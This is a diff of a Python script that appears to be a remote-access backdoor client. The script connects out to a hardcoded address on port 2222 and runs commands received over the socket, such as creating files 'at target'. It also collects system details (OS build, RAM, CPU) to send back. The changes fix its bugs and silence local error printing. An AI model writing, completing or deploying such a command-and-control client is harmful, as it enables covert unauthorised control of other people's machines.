@@ -3,13 +3,15 @@ import os
 import shutil
 import platform
 import psutil
-import importlib
 import stat
 # from colorama import Fore, Style
 
+def get_network_interfaces():
+    pass
+
 def get_system_information():
     if platform.system() == 'Windows':
-        getBuildNumber = platform.version().split('.')[2]
+        getBuildNumber = int(platform.version().split('.')[2])
         if getBuildNumber < 22000:
             os_name = 'Windows 10'
         elif getBuildNumber >= 22000:
@@ -51,7 +53,6 @@ def get_system_information():
         curr_ram,
         psutil.cpu_percent(),
         'NETWORK INFORMATION'.center(150),
-        "hello"
     ).encode()
 
 def create_thing(get_cmd,sock):
@@ -62,7 +63,7 @@ def create_thing(get_cmd,sock):
         try:
             with open(file_or_folder,'w') as f:
                 f.write('')
-            sock.send(b'the file \'{}\' created at target successfully')
+            sock.send('the file \'{}\' created at target successfully'.format(file_or_folder).encode())
         except Exception as err:
             sock.send(str(err).encode())
     
@@ -76,9 +77,9 @@ def create_thing(get_cmd,sock):
     else:
         print('will write help for touch command')
 
-def main():
+def main_root():
     sock = st.socket(st.AF_INET, st.SOCK_STREAM)
-    sock.connect(('192.168.81.36',2222))
+    sock.connect(('192.168.81.14',2222))
 
     while True:
         get_cmd = sock.recv(1024).decode().strip()
@@ -155,7 +156,7 @@ def main():
                 sock.send('Invalid command found : {}'.format(get_cmd).encode())
 
         except Exception as err:
-            print(err)
+            # print(err)
             sock.send(str(err).encode())
             continue
         
